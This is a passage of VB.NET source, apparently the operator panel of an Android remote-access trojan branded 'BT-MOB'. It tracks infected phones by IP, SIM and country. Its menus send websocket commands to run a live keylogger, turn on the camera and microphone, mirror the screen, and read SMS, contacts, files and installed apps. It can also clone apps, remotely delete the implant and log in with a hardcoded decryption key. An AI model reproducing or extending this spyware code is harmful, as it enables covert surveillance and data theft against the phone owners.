                ClassClient.row.Cells(2).Value = ClassClient.screen
                ClassClient.row.Cells(11).Value = ClassClient.battery

                ClassClient.row.Cells(7).Value = ClassClient.Foundedjects

                If ClassClient.jects_count <> "0" Then
                    ClassClient.row.Cells(14).Value = My.Resources.ject_on

                Else
                    ClassClient.row.Cells(14).Value = My.Resources.ject_off
                End If
                ClassClient.row.Cells(12).Value = ClassClient.charging & "%"
                ClassClient.row.Cells(13).Value = ClassClient.activewindow
                ClassClient.row.Cells(15).Value = ClassClient.angle
                ClassClient.row.Cells(16).Value = ClassClient.lights
                ClassClient.row.Cells(17).Value = ClassClient.pingms & " ms"
                ' MainForm.DGV0.Refresh()
            Catch ex As Exception
                Log_e("UpdateClient_1", EXtoString(ex))
            End Try
            ' End SyncLock

        End If
    End Sub


    Private locktable As New Object()
    Delegate Sub AddClient_dele(objs As Object())
    Public Sub AddClient(objs As Object())
        If Me.InvokeRequired Then
            Dim logr As AddClient_dele = New AddClient_dele(AddressOf AddClient)
            Me.Invoke(logr, New Object() {objs})
            Exit Sub
        Else

            Dim newClient As BTClient = objs(0)



            ' SyncLock locktable

            Dim rownum As Integer = DGV0.Rows.Add(newClient.wallpaper,
            newClient.flag,
            newClient.screen,
            newClient.name,
            newClient.country & vbNewLine & newClient.sim,
            newClient.address,
            newClient.android,
            newClient.tracking,
            newClient.installdate,
            newClient.version,
            newClient.wifi,
            newClient.battery,
            newClient.charging & "%",
            "",
            My.Resources.ject_off,
            "",
            "",
            newClient.pingms,
            newClient.MobName)

            DrakeUIScrollBar1.Maximum = DGV0.Rows.Count

            Dim CliRow As DataGridViewRow = DGV0.Rows(rownum)
            CliRow.Height = 45

            CliRow.Tag = newClient.mobid


            newClient.row = CliRow

            CliRow.Cells(0).Tag = newClient

            If BTRegistry.ReadBool(BTSettings.Notify_newcli, False) Then
                BTAlerter.custom(newClient.name &
                        vbNewLine &
                        newClient.country &
                        vbNewLine &
                        newClient.version, newClient.wallpaper, Color.DeepSkyBlue)
            End If


            BTEngine.MainForm.LogConnection(BTConst.Connectedstr, connectionicon("in"), newClient.address, newClient.name)

            '  End SyncLock

        End If
    End Sub

    Delegate Sub RemoveClient_dele(objs As Object())
    Public Sub RemoveClient(objs As Object())
        If Me.DGV0.InvokeRequired Then
            Dim logr As RemoveClient_dele = New RemoveClient_dele(AddressOf RemoveClient)
            Me.DGV0.Invoke(logr, New Object() {objs})
            Exit Sub
        Else
            ' SyncLock locktable
            Dim ClassClient As BTClient = objs(0)
            DGV0.Rows.Remove(ClassClient.row)
            DrakeUIScrollBar1.Maximum = DGV0.Rows.Count
            BTEngine.clients.Remove(ClassClient.mobid)
            ClassClient.row = Nothing
            If BTRegistry.ReadBool(BTSettings.Notify_disconnect) Then
                BTAlerter.custom(Disconnectedstr + ": " + ClassClient.name,
                                 ClassClient.wallpaper,
                                  Color.Red)
            End If
            'ClassClient.wallpaper.Dispose()
            'ClassClient.screen.Dispose()
            'ClassClient.wifi.Dispose()
            'ClassClient.battery.Dispose()
            'ClassClient.flag.Dispose()


            LogConnection(BTConst.Connectedstr, connectionicon("out"), ClassClient.address, ClassClient.name)
            '  End SyncLock

        End If
    End Sub
    Private Sub UpdateStatusLabels()
        ' Update UI based on connection status and bytes sent/received

        Dim send, recived As Long
        send = BTEngine.BytesSent
        recived = BTEngine.BytesReceived

        Dim ary As Array = UploadDownload(send, recived)

        Dim statuefinal As String = ""

        statuefinal += webSocketClient.SocketState
        statuefinal += Space(5)
        statuefinal += $"{speedstr}: " & PingMS & "ms"
        statuefinal += Space(5)
        ' Display Bytes Sent and Received
        statuefinal += $"↑ {ary.GetValue(1)}"
        statuefinal += Space(5)
        statuefinal += $"↓ {ary.GetValue(0)}"
        statuefinal += Space(5)
        statuefinal += ($"({BTEngine.clients.Count}) " + Clientsstr)
        statuefinal += Space(5)
        statuefinal += ($"({DGV0.SelectedRows.Count}) " + Selectedstr)
        mainstatelabel.Text = statuefinal
    End Sub




    Private Sub maintitle_MouseDown(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseDown, maintitle.MouseDown
        Try
            If e.Button = Windows.Forms.MouseButtons.Left Then
                Me.Size = New Size(start_W, start_H)
                Me.Tag = False

                ReleaseCapture()
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub connecttimer_Tick(sender As Object, e As EventArgs) Handles statestimer.Tick
        UpdateStatusLabels()
    End Sub

    Private Async Sub loginworker_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles loginworker.DoWork



        Try
repet:
            Do
                Thread.Sleep(1000)
            Loop While holdlogin

            currentstate = Authenticatistr

            Dim usermail = BTRegistry.GetValue(Regz.uemail, "")
            Dim userpass = BTRegistry.GetValue(Regz.upass, "")
            Dim pinkey = BTRegistry.GetValue(Regz.pkey, "")

            If isEmpty(usermail) Or isEmpty(userpass) Or isEmpty(pinkey) Then
                holdlogin = True
                locklogin = False
                GoTo repet
                Return
            End If



            Dim Randomkey As String = RandomString(32)
            Dim result = Await startlogin(usermail, userpass, pinkey, Randomkey, MainhttpClient)
            If result.Item1 Then
                Try
                    Dim response As String = result.Item2.Replace("\", "")
                    Dim datajson As String = DecryptReply(Randomkey, "BT-MOB" & "!B6twG9+&U", response)

                    Dim resjson As JObject = JObject.Parse(datajson)

                    If resjson("nxtkey") IsNot Nothing Then

                        Mainnextkey = resjson("nxtkey")

                        BTEngine.u_email = resjson("emil")
                        BTEngine.share_link = resjson("elink")
                        BTEngine.u_uid = resjson("uid")
                        BTEngine.u_subtype = resjson("stype")
                        BTEngine.u_exp = resjson("exp")


                    End If



                    Me.Invoke(Sub()
                                  'MyAlerter.Success("all good")
                                  joinworker.RunWorkerAsync()
                                  WaitLogin = False
                              End Sub)
                Catch ex As Exception
                    Me.Invoke(Sub()
                                  BTAlerter.erroes(BTConst.smthngwrongstr)
                              End Sub)

                    Log_e("Bad Response", result.Item2)
                    holdlogin = True
                    locklogin = False
                    GoTo repet
                    Return
                End Try

            Else

                Me.Invoke(Sub()
                              BTAlerter.erroes(result.Item2)
                          End Sub)
                holdlogin = True
                locklogin = False
                GoTo repet
                Return

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Async Sub joinworker_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles joinworker.DoWork
        Try

            Do
                Thread.Sleep(1000)
            Loop While Waitjoin


            Dim datajoin As String = Await JoinServer(New With {
                  .case = "join",
                  .ping = "0",
                  .ismain = "1",
                  .chk = Mainnextkey
             }, MainhttpClient)



            Dim result As JObject = JObject.Parse(datajoin) ' datajoin = Dim errorResponse As String = "{""Fail"":""unknown error""}"

            ' Check the result for success or failure
            If result("Success") IsNot Nothing Then
                Dim datastr As String = result("Success").ToString.Trim("""")
                Log_d("Main IDF websock", datastr)
                Main_IDF = datastr
                connectionThread = New Thread(Sub() webSocketClient.Connect(datastr))
                connectionThread.IsBackground = True
                connectionThread.Start()
                holdjoin = False
                Exit Sub
            ElseIf result("Fail") IsNot Nothing Then
                MyMsg.Show("failed: ", result("Fail").ToString(), msgtype.errors, False)
            End If


        Catch ex As Exception

        End Try
        Environment.Exit(0)
    End Sub
    Dim Myyy As Integer
    Dim Sh As Integer
    Dim movY As Boolean
    Private Sub DrakeWidth_W8_MouseDown(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W8.MouseDown
        movY = True
        Myyy = MousePosition.Y
        Sh = Height
    End Sub

    Private Sub DrakeWidth_W8_MouseMove(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W8.MouseMove
        If movY = True Then
            Height = MousePosition.Y - Myyy + Sh
        End If
    End Sub

    Private Sub DrakeWidth_W8_MouseUp(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W8.MouseUp
        movY = False
        start_H = Me.Size.Height

    End Sub

    Dim Mx As Integer
    Dim Sw As Integer
    Dim movX As Boolean
    Private Sub DrakeWidth_W7_MouseDown(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W7.MouseDown
        movX = True
        Mx = MousePosition.X
        Sw = Width
    End Sub

    Private Sub DrakeWidth_W7_MouseMove(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W7.MouseMove
        If movX = True Then
            Width = MousePosition.X - Mx + Sw

        End If
    End Sub

    Private Sub DrakeWidth_W7_MouseUp(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W7.MouseUp
        movX = False
        start_W = Me.Size.Width
    End Sub

    Private Sub DrakeUIButtonIcon10_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon10.Click
        If Me.Tag Is Nothing OrElse CBool(Me.Tag) = False Then
            ' Maximize within the working area without covering the taskbar
            Me.Bounds = Screen.PrimaryScreen.WorkingArea
            Me.Tag = True  ' Mark as maximized
        Else
            ' Restore to a predefined normal size and center manually
            Me.Size = New Size(start_W, start_H)
            Me.Tag = False
        End If
    End Sub

    Private settingpage As settingsfrm
    Private Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles stngbtn.Click
        If settingpage Is Nothing Then
            settingpage = New settingsfrm
            settingpage.ShowDialog()
            settingpage = Nothing
        End If

    End Sub
    ' Dim searchbefore As New List(Of DataGridViewRow)

    Private Sub passtext_TextChanged(sender As Object, e As EventArgs) Handles searchtext.TextChanged

        If Not String.IsNullOrEmpty(searchtext.Text) Then
            emptysearch.Visible = True
            trysearch()
        Else
            emptysearch.Visible = False
            ShowAllRows() ' Show all rows when the search box is empty
            ' searchbefore.Clear()
        End If
    End Sub
    Public Sub trysearch()
        If DGV0.Rows.Count < 1 Then
            Return
        End If

        If String.IsNullOrEmpty(searchtext.Text) Then
            Return
        End If

        Dim searchTerm As String = searchtext.Text.ToLower()
        'searchbefore.Clear() ' Clear previous search results

        For Each row As DataGridViewRow In DGV0.Rows
            Try
                Dim Tclient As BTClient = DirectCast(row.Cells(0).Tag, BTClient)
                Dim rowMatchesSearch As Boolean =
                Tclient.name.ToLower().Contains(searchTerm) OrElse
                Tclient.address.ToLower().Contains(searchTerm) OrElse
                Tclient.country.ToLower().Contains(searchTerm) OrElse
                Tclient.installdate.ToLower().Contains(searchTerm) OrElse
                Tclient.version.ToLower().Contains(searchTerm) OrElse
                Tclient.tracking.ToLower().Contains(searchTerm) OrElse
                Tclient.android.ToLower().Contains(searchTerm) OrElse
                Tclient.activewindow.ToLower().Contains(searchTerm)

                If rowMatchesSearch Then
                    row.Visible = True ' Show matching rows
                    ' searchbefore.Add(row)
                Else
                    row.Visible = False ' Hide non-matching rows
                End If
            Catch ex As Exception
                ' Handle any potential errors, e.g., if Tag is not a BTClient
            End Try
        Next
    End Sub

    ' Helper method to show all rows
    Private Sub ShowAllRows()
        For Each row As DataGridViewRow In DGV0.Rows
            row.Visible = True
        Next
    End Sub


    Private Sub emptysearch_Click(sender As Object, e As EventArgs) Handles emptysearch.Click
        searchtext.Text = ""
    End Sub



    Private Sub ClearAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearAllToolStripMenuItem.Click
        CONDGV.Rows.Clear()
    End Sub

    Public Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStrip_files.Click
        If DGV0.SelectedRows.Count > 0 Then
            Try
                For Each Ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        If Ro.Tag IsNot Nothing Then
                            Dim mobid As String = DirectCast(Ro.Tag, String)
                            If mobid IsNot Nothing Then

                                Dim handle As String = "BT-" & "Files-" & mobid

                                Dim FileManager As filesmanager = My.Application.OpenForms(handle)

                                If FileManager Is Nothing Then


                                    Dim data As New With {
                                         .subcommand = "L",
                                          .newpth = "get0"
                                    }

                                    Dim commandstr As String = FormatCommand("files", data)


                                    Dim chatData As New Dictionary(Of String, Object) From {
                                                                {"msg", wrk},
                                                                {"cmnd", commandstr}
                                    }
                                    webSocketClient.SendComCommand(chatData, mobid)

                                Else
                                    filesmanager.BringToFront()
                                End If

                            End If
                        End If

                    Catch ex As Exception

                    End Try
                Next

            Catch ex As Exception

            End Try

        End If
    End Sub

    Private Sub DrakeUIButtonIcon6_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon6.Click
        Me.WindowState = WindowState.Minimized
    End Sub

    Private Sub DGV0_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles DGV0.MouseDoubleClick
        startuserfolder()
    End Sub

    Private Sub ToolStripMenuItem10_Click(sender As Object, e As EventArgs) Handles ToolStrip_clifolder.Click
        startuserfolder()
    End Sub

    Private Sub startuserfolder()
        If DGV0.SelectedRows.Count > 0 Then
            Try
                For Each Ro As DataGridViewRow In DGV0.SelectedRows
                    Try

                        Dim mobid As String = DirectCast(Ro.Tag, String)
                        If mobid IsNot Nothing Then

                            Try
                                Dim down As String = USERS_Path & "\" & mobid

                                If Not IO.Directory.Exists(down) Then

                                    IO.Directory.CreateDirectory(down)

                                End If

                                Process.Start(down)
                            Catch ex As Exception

                            End Try

                        End If


                    Catch ex As Exception

                    End Try
                Next

            Catch ex As Exception

            End Try

        End If
    End Sub

    Public Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStrip_manage.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "prof-" & Tclient.mobid

                            Dim cliprofile As profile = My.Application.OpenForms(handle)

                            If cliprofile Is Nothing Then

                                cliprofile = New profile
                                cliprofile.Name = handle
                                cliprofile.Btcli = Tclient

                                cliprofile.Show()
                            Else
                                cliprofile.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Public Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ToolStrip_scr.Click
        If DGV0.SelectedRows.Count > 0 Then

            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "Screen-" & Tclient.mobid

                            Dim screenform As ScreenMonitor = My.Application.OpenForms(handle)

                            If screenform Is Nothing Then

                                screenform = New ScreenMonitor
                                screenform.Name = handle
                                screenform.Btcli = Tclient

                                screenform.Show()
                            Else
                                screenform.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Public Sub ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles ToolStrip_cam.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "Camera-" & Tclient.mobid

                            Dim camform As CameraMonitor = My.Application.OpenForms(handle)

                            If camform Is Nothing Then

                                Dim data As New With {
                                     .subcommand = "L"
                                 }

                                Dim commandstr As String = FormatCommand("Cam", data)


                                Dim chatData As New Dictionary(Of String, Object) From {
                                                                    {"msg", wrk},
                                                                    {"cmnd", commandstr}
                                        }
                                BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                            Else
                                camform.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Public Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStrip_mic.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "Microphone-" & Tclient.mobid

                            Dim screenform As MicMonitor = My.Application.OpenForms(handle)

                            If screenform Is Nothing Then

                                screenform = New MicMonitor
                                screenform.Name = handle
                                screenform.Btcli = Tclient

                                screenform.Show()
                            Else
                                screenform.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Public Sub ToolStripMenuItem7_Click(sender As Object, e As EventArgs) Handles ToolStrip_msgs.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "SMS-" & Tclient.mobid

                            Dim smsform As SmsManager = My.Application.OpenForms(handle)

                            If smsform Is Nothing Then

                                Dim data As New With {
                                     .subcommand = "L",
                                     .tpath = "All"
                                 }

                                Dim commandstr As String = FormatCommand("SMS", data)


                                Dim chatData As New Dictionary(Of String, Object) From {
                                                                    {"msg", wrk},
                                                                    {"cmnd", commandstr}
                                        }
                                BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                            Else
                                smsform.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Public Sub ToolStripMenuItem8_Click(sender As Object, e As EventArgs) Handles ToolStrip_contct.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "Contacts-" & Tclient.mobid

                            Dim conform As ContactsManager = My.Application.OpenForms(handle)

                            If conform Is Nothing Then

                                Dim data As New With {
                                     .subcommand = "L"
                                 }

                                Dim commandstr As String = FormatCommand("Contacts", data)


                                Dim chatData As New Dictionary(Of String, Object) From {
                                                                    {"msg", wrk},
                                                                    {"cmnd", commandstr}
                                        }
                                BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                            Else
                                conform.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Public Sub ToolStripMenuItem9_Click(sender As Object, e As EventArgs) Handles ToolStrip_apps.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "APPS-" & Tclient.mobid

                            Dim conform As ContactsManager = My.Application.OpenForms(handle)

                            If conform Is Nothing Then

                                Dim data As New With {
                                     .subcommand = "L"
                                 }

                                Dim commandstr As String = FormatCommand("Apps", data)


                                Dim chatData As New Dictionary(Of String, Object) From {
                                                                    {"msg", wrk},
                                                                    {"cmnd", commandstr}
                                        }
                                BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)


                                Dim cloneload As New Dictionary(Of String, Object) From {
                                 {"msg", "clone"},
                                 {"subc", "L"}
                                }
                                BTEngine.commands(cloneload, Tclient.mobid, BTEngine.MainForm.webSocketClient)


                            Else
                                conform.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Public Sub ToolStripMenuItem14_Click(sender As Object, e As EventArgs) Handles ToolStrip_keylog.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "Keylogger-" & Tclient.mobid

                            Dim klogrform As LiveKeylogger = My.Application.OpenForms(handle)

                            If klogrform Is Nothing Then

                                Dim data As New With {
                                     .subcommand = "V",
                                     .nstate = "1"
                                 }
                                Dim commandstr As String = FormatCommand("Activitys", data)


                                Dim chatData As New Dictionary(Of String, Object) From {
                                                    {"msg", wrk},
                                                    {"cmnd", commandstr}
                                   }
                                BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)


                            Else
                                klogrform.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem12_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem12.Click

        If DGV0.SelectedRows.Count > 0 Then

            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try

                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then
                            Dim handlename As String = Tclient.name & " | " & Tclient.country & " | " & Tclient.address & " | " & Tclient.mobid
                            If Not ListBoxBlocks.Items.Contains(handlename) Then
                                ListBoxBlocks.Items.Add(handlename)
                            End If


                            If Not BTEngine.BlockedClients.Contains(Tclient.mobid) Then
                                LogConnection(BTConst.Blockedstr, connectionicon("block"), Tclient.address, blockidstr)
                                BTEngine.BlockedClients.Add(Tclient.mobid)

                            End If

                            If Not BTEngine.BlockedClients.Contains(Tclient.address) Then
                                LogConnection(BTConst.Blockedstr, connectionicon("block"), Tclient.address, blockipstr)
                                BTEngine.BlockedClients.Add(Tclient.address)

                            End If

                        End If
                        Tclient.startTime = DateTime.Now.AddSeconds(3)
                    End If
                Catch ex As Exception
                End Try
            Next
        End If


    End Sub

    Private Sub ToolStripMenuItem13_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem13.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim data As New With {
                                         .subcommand = "R"
                                     }
                            Dim commandstr As String = FormatCommand("Connection", data)


                            Dim chatData As New Dictionary(Of String, Object) From {
                                                        {"msg", wrk},
                                                        {"cmnd", commandstr}
                                       }
                            BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)
                            Tclient.startTime = DateTime.Now.AddSeconds(1)

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If

    End Sub

    Private Sub BlockToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BlockToolStripMenuItem.Click
        'Delete

        If DGV0.SelectedRows.Count > 0 Then



            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try

                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        Dim data As New With {
                                  .subcommand = "0"
                          }
                        Dim commandstr As String = FormatCommand("Delete", data)


                        Dim chatData As New Dictionary(Of String, Object) From {
                            {"msg", wrk},
                            {"cmnd", commandstr}
                          }
                        BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)
                        Tclient.startTime = DateTime.Now.AddSeconds(3)
                    End If
                Catch ex As Exception
                End Try
            Next
        End If


    End Sub

    Private Sub DrakeUIButtonIcon12_Click(sender As Object, e As EventArgs) Handles blocksbtn.Click
        For Each btn As DrakeUI.Framework.DrakeUIButtonIcon In mainbtns
            If btn.Name <> DirectCast(sender, DrakeUI.Framework.DrakeUIButtonIcon).Name Then
                btn.ForeColor = Color.White
                btn.RectColor = Color.Gray
            Else
                btn.ForeColor = Color.DodgerBlue
                btn.RectColor = Color.DodgerBlue
            End If
        Next
        panel_list_block.BringToFront()
        maintitle.Text = $" #{BTEngine.u_uid} | " & blockliststr
    End Sub

    Private Sub ToolStripMenuItem15_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem15.Click
        If ListBoxBlocks.Items.Count > 0 Then
            Dim itemsToRemove As New List(Of Object)

            For Each itm In ListBoxBlocks.Items
                Try
                    Dim items As String() = itm.ToString.Split(New String() {" | "}, StringSplitOptions.None)
                    If items.Length >= 4 Then
                        Dim address As String = items(2)
                        Dim mobid As String = items(3)

                        If BTEngine.BlockedClients.Contains(mobid) Then
                            BTEngine.BlockedClients.Remove(mobid)
                        End If

                        If BTEngine.BlockedClients.Contains(address) Then
                            BTEngine.BlockedClients.Remove(address)
                        End If

                        itemsToRemove.Add(itm)
                    Else
                        Console.WriteLine("Invalid item format: " & itm)
                    End If
                Catch ex As Exception

                    Console.WriteLine("Error in unblock: " & ex.Message)
                End Try
            Next

            ' Remove items after the loop
            For Each itm In itemsToRemove
                ListBoxBlocks.Items.Remove(itm)
            Next
        End If

    End Sub

    Public Sub ToolStripMenuItem11_Click(sender As Object, e As EventArgs) Handles ToolStrip_brows.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "WebBrowser-" & Tclient.mobid

                            Dim browserform As WebBrowser = My.Application.OpenForms(handle)

                            If browserform Is Nothing Then

                                browserform = New WebBrowser
                                browserform.Name = handle
                                browserform.Btcli = Tclient

                                browserform.Show()
                            Else
                                browserform.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem16_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem16.Click
        If MyMsg.Show("Reconnect when app opens", "Are you sure you want to stop this app ?", msgtype.Confirm, True) = DialogResult.OK Then
            If DGV0.SelectedRows.Count > 0 Then
                For Each Ro As DataGridViewRow In DGV0.SelectedRows
                    Try
                        If Ro.Tag IsNot Nothing Then
                            Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                            If Tclient.mobid IsNot Nothing Then

                                Dim data As New With {
                                         .subcommand = "D"
                                     }
                                Dim commandstr As String = FormatCommand("Connection", data)


                                Dim chatData As New Dictionary(Of String, Object) From {
                                                        {"msg", wrk},
                                                        {"cmnd", commandstr}
                                       }
                                BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                            End If
                        End If

                    Catch ex As Exception

                    End Try
                Next
            End If
        End If
    End Sub

    Private Sub DrakeUIButtonIcon7_Click(sender As Object, e As EventArgs) Handles scrsbtn.Click
        'Panel_screens
        For Each btn As DrakeUI.Framework.DrakeUIButtonIcon In mainbtns
            If btn.Name <> DirectCast(sender, DrakeUI.Framework.DrakeUIButtonIcon).Name Then
                btn.ForeColor = Color.White
                btn.RectColor = Color.Gray
            Else
                btn.ForeColor = Color.DodgerBlue
                btn.RectColor = Color.DodgerBlue
            End If
        Next
        Panel_screens.BringToFront()
        maintitle.Text = $" #{BTEngine.u_uid} | " & screensstr
    End Sub

    Private Sub DrakeUIButtonIcon11_Click(sender As Object, e As EventArgs) Handles alrtsbtn.Click
        For Each btn As DrakeUI.Framework.DrakeUIButtonIcon In mainbtns
            If btn.Name <> DirectCast(sender, DrakeUI.Framework.DrakeUIButtonIcon).Name Then
                btn.ForeColor = Color.White
                btn.RectColor = Color.Gray
            Else
                btn.ForeColor = Color.DodgerBlue
                btn.RectColor = Color.DodgerBlue
            End If
        Next
        panel_notifys.BringToFront()
        maintitle.Text = $" #{BTEngine.u_uid} | " & Notificationsstr
    End Sub

    Public Sub insertnotification(wallp As Bitmap, uname As String, title As String, msg As String)
        If Me.InvokeRequired Then
            Me.Invoke(New Action(Sub()
                                     insertnotification(wallp, uname, title, msg)
                                 End Sub))
        Else
            If DGVALRTS.Rows.Count > 50 Then
                DGVALRTS.Rows.Clear()
            End If
            DGVALRTS.Rows.Add(wallp, uname, title, msg, DateTime.Now.ToString)
            If BTRegistry.ReadBool(BTSettings.Notify_mobs, False) Then
                BTAlerter.custom(title & vbNewLine & msg,
                                 wallp,
                                 Color.FromArgb(40, 40, 40))
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem17_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem17.Click
        DGVALRTS.Rows.Clear()
    End Sub


    Private broadcastform As BTBroadcast

    Private Sub broadbtn_Click(sender As Object, e As EventArgs) Handles broadbtn.Click
        If DGV0.Rows.Count > 0 Then
            Dim holdlist As New List(Of BTClient)

            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        holdlist.Add(Tclient)
                    End If
                Catch ex As Exception
                    ' Ignore or log the exception
                End Try
            Next

            If holdlist.Count > 0 Then
                ' Only create if not already open or disposed
                If broadcastform Is Nothing OrElse broadcastform.IsDisposed Then
                    broadcastform = New BTBroadcast()
                    broadcastform.listclients = holdlist

                    ' Disable the main form to simulate modal behavior
                    'Me.Enabled = False

                    ' When the broadcast form closes, re-enable main form
                    AddHandler broadcastform.FormClosed, Sub()
                                                             ' Me.Enabled = True
                                                             broadcastform = Nothing
                                                         End Sub

                    broadcastform.Show() ' Pass owner to help keep it on top
                Else
                    ' Bring existing instance to the front
                    broadcastform.BringToFront()
                    broadcastform.Focus()
                End If
            End If
        End If
    End Sub



    Private appsmanager As BTApps
    Private Sub DrakeUIButtonIcon3_Click(sender As Object, e As EventArgs) Handles appsbtn.Click
        If appsmanager Is Nothing Then
            appsmanager = New BTApps(Mainnextkey, MainhttpClient)
            appsmanager.ShowDialog()
            appsmanager = Nothing
        End If
    End Sub

